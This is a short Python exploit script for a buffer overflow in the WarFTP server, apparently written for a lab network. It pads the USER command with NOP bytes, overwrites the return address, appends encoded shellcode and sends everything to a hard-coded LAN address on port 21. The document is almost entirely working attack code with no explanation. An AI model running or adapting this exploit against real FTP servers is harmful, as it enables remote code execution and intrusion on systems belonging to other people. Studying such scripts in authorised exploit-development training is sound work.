#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
buffer = "\x90" * 485
#buffer += "\xED\x1E\x94\x7C"
buffer += "\xD7\x30\x9D\x7C"
buffer += "\x90" * 32
buffer += (
"\xdb\xdc\xd9\x74\x24\xf4\xba\xbd\xb7\xb8\xf8\x5e\x2b\xc9" 
"\xb1\x4f\x31\x56\x19\x03\x56\x19\x83\xc6\x04\x5f\x42\x44" 
"\x10\x16\xad\xb5\xe1\x48\x27\x50\xd0\x5a\x53\x10\x41\x6a" 
"\x17\x74\x6a\x01\x75\x6d\xf9\x67\x52\x82\x4a\xcd\x84\xad" 
"\x4b\xe0\x08\x61\x8f\x63\xf5\x78\xdc\x43\xc4\xb2\x11\x82" 
"\x01\xae\xda\xd6\xda\xa4\x49\xc6\x6f\xf8\x51\xe7\xbf\x76" 
"\xe9\x9f\xba\x49\x9e\x15\xc4\x99\x0f\x22\x8e\x01\x3b\x6c" 
"\x2f\x33\xe8\x6f\x13\x7a\x85\x5b\xe7\x7d\x4f\x92\x08\x4c" 
"\xaf\x78\x37\x60\x22\x81\x7f\x47\xdd\xf4\x8b\xbb\x60\x0e" 
"\x48\xc1\xbe\x9b\x4d\x61\x34\x3b\xb6\x93\x99\xdd\x3d\x9f" 
"\x56\xaa\x1a\xbc\x69\x7f\x11\xb8\xe2\x7e\xf6\x48\xb0\xa4" 
"\xd2\x11\x62\xc5\x43\xfc\xc5\xfa\x94\x58\xb9\x5e\xde\x4b" 
"\xae\xd8\xbd\x03\x03\xd6\x3d\xd4\x0b\x61\x4d\xe6\x94\xd9" 
"\xd9\x4a\x5c\xc7\x1e\xac\x77\xbf\xb1\x53\x78\xbf\x98\x97" 
"\x2c\xef\xb2\x3e\x4d\x64\x43\xbe\x98\x2a\x13\x10\x73\x8a" 
"\xc3\xd0\x23\x62\x0e\xdf\x1c\x92\x31\x35\x2b\x95\xa6\x76" 
"\x84\x18\xb7\x1f\xd7\x1a\xa6\x83\x5e\xfc\xa2\x2b\x37\x57" 
"\x5b\xd5\x12\x23\xfa\x1a\x89\xa3\x9f\x89\x56\x33\xe9\xb1" 
"\xc0\x64\xbe\x04\x19\xe0\x52\x3e\xb3\x16\xaf\xa6\xfc\x92" 
"\x74\x1b\x02\x1b\xf8\x27\x20\x0b\xc4\xa8\x6c\x7f\x98\xfe" 
"\x3a\x29\x5e\xa9\x8c\x83\x08\x06\x47\x43\xcc\x64\x58\x15" 
"\xd1\xa0\x2e\xf9\x60\x1d\x77\x06\x4c\xc9\x7f\x7f\xb0\x69" 
"\x7f\xaa\x70\x99\xca\xf6\xd1\x32\x93\x63\x60\x5f\x24\x5e" 
"\xa7\x66\xa7\x6a\x58\x9d\xb7\x1f\x5d\xd9\x7f\xcc\x2f\x72" 
"\xea\xf2\x9c\x73\x3f")
s.connect(('192.168.1.128',21))
data = s.recv(1024)
print ("Sending data to WarFTP...")
s.send('USER '+buffer+'\r\n')
data = s.recv(1024)
s.send(' PASS PASSWORD '+'\r\n')
s.close()
print ("Finish")
